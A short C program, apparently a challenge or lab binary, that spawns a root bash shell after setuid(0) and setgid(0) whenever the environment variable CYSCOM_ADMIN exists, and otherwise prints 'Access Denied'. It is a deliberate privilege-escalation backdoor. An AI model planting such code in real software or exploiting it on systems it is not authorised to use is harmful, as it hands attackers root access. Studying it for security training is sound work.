#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *env = getenv("CYSCOM_ADMIN");
    if (env != NULL) {
        setuid(0);
        setgid(0);
        system("/bin/bash");
    } else {
        puts("Access Denied");
    }
    return 0;
}
